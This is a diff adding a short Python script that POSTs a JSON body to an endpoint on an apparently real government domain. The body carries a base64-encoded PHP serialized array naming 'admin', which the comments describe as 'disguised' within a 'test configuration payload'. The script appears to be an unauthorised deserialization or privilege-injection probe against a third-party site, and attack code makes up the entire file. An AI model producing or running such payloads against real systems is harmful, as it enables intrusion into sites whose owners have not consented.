@@ -1,0 +1,23 @@
+import requests
+
+# Example endpoint
+endpoint_url = "https://www.RCU.gov.sa/data/submit"
+
+# Simulated sensitive data disguised within a nested JSON structure
+data = {
+    "session_id": "89f8f6a7d8b9c0d1e2",
+    "payload": {
+        "access": "YToxOntpOjA7czo0OiJhZG1pbiI7fQ=="  # Base64 encoded string of serialized data (e.g., PHP serialized array)
+    },
+    "meta": {
+        "type": "configuration",
+        "description": "This is a test configuration payload."
+    }
+}
+
+# Send POST request
+response = requests.post(endpoint_url, json=data)
+
+# Print response (for testing purposes only)
+print("Status Code:", response.status_code)
+print("Response Body:", response.text)
